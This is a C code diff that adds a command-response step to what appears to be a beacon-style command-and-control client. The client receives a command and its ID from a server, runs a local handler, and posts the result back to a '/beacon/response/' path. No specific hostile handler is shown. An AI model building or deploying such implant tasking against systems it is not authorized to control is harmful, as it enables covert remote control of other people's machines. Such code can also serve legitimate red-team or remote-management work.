@@ -198,17 +198,20 @@ static bool check_for_commands(ClientContext* ctx) {
   DEBUG_LOG("Parsing response: %s", resp.data);
 
   char* command = NULL;
+  char command_id[32] = {0};  // Buffer for command ID string
   char* lines = strdup(resp.data);
   if (!lines) {
     free_http_response(&resp);
     return false;
   }
 
+  // Parse command and command ID
   char* line = strtok(lines, "\n");
   while (line) {
     if (strncmp(line, "command: ", 9) == 0) {
       command = strdup(line + 9);
-      break;
+    } else if (strncmp(line, "id: ", 4) == 0) {
+      strncpy(command_id, line + 4, sizeof(command_id) - 1);
     }
     line = strtok(NULL, "\n");
   }
@@ -216,21 +219,42 @@ static bool check_for_commands(ClientContext* ctx) {
   free(lines);
   free_http_response(&resp);
 
-  if (command) {
-    DEBUG_LOG("Found command: %s", command);
+  if (command && command_id[0]) {  // If we have both command and ID
+    DEBUG_LOG("Found command: %s (ID: %s)", command, command_id);
     command_handler handler = get_command_handler(command);
     if (handler) {
       DEBUG_LOG("Found handler for command: %s", command);
       char* result = handler();
       if (result) {
         DEBUG_LOG("Command execution result: %s", result);
-        // TODO: Implement command response protocol
+
+        // Create response using our protocol
+        ProtocolBuilder* builder =
+            protocol_create_command_response(command_id, result);
+        if (builder) {
+          // Send response back to server
+          char response_url[256];
+          snprintf(response_url, sizeof(response_url), "/beacon/response/%s/%s",
+                   ctx->config.client_id, command_id);
+
+          http_request_t resp_req = {
+              .url_path = response_url,
+              .body = protocol_get_message(builder),
+              .body_length = protocol_get_length(builder)};
+
+          http_response_t resp_resp = {0};
+          if (send_http_request(ctx, &resp_req, &resp_resp) ==
+              NETWORK_SUCCESS) {
+            DEBUG_LOG("Command response sent successfully");
+          } else {
+            DEBUG_LOG("Failed to send command response");
+          }
+
+          protocol_builder_destroy(builder);
+          free_http_response(&resp_resp);
+        }
         free(result);
-      } else {
-        DEBUG_LOG("Command execution returned no result");
       }
-    } else {
-      DEBUG_LOG("No handler found for command: %s", command);
     }
     free(command);
   }
